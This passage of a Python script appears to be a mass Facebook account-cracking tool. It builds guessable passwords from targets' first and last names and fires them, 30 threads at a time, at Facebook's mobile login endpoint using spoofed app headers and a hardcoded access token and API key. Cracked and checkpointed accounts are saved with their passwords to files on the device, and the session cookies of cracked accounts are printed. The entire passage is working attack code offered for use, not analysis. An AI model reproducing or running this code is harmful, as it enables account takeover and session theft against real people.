            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=30) as speede:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()  
      



####@-----Random-----@####
def andom():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o': 
        tpp = input(f'{oo("?")}Total Password? : ')
        totalpass.append('first')
        totalpass.append('last')
        if tpp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(tpp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/Hannan-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   



 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

      
    for x in open('.rndm','r').read().splitlines():
    	accounts.append(x)
    
    if m=='2':
        with speed(max_workers=30) as speeed:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()




Hxw_Main()